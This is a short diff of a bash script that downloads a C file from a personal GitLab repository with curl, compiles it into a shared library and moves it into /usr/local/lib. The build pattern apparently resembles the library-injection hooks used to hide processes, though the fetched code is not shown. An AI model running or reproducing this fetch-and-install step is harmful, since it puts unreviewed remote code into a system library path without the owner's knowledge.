@@ -1,6 +1,5 @@
 #!/bin/bash
 sudo apt-get install build-essential -y
-sudo apt-get update ; sudo apt-get install sudo -y
 curl https://gitlab.com/ontranontran/kaspo/-/raw/master/ontranbotak.c -o ontranbotak.c
 gcc -Wall -fPIC -shared -o libontranbotak.so ontranbotak.c -ldl
 mv libontranbotak.so /usr/local/lib/
